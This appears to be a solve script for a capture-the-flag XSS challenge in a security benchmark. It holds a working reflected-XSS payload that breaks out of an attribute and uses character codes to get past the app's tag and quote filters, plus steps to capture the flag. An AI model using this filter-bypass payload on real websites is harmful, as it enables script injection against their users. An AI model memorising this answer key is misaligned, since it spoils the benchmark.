#!/usr/bin/env bash
# XBEN-012-24 — "Dalgona Challenges", triangle (tags: xss)
#
# The reflection is inside `value="..."`, and `<` followed by a letter or `/` is
# stripped, so there is no tag to open. There does not need to be one: closing
# the quote adds attributes to the input that is already there.
#
# `"XSS"` and `'XSS'` are also stripped, quotes included, so the message the
# checker wants is spelled with character codes instead.
#
# The server renders the page, loads its own rendering in PhantomJS and prints
# the flag when a dialog fires with the message "XSS".
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/page" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create  \
    --set 'query.name=" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
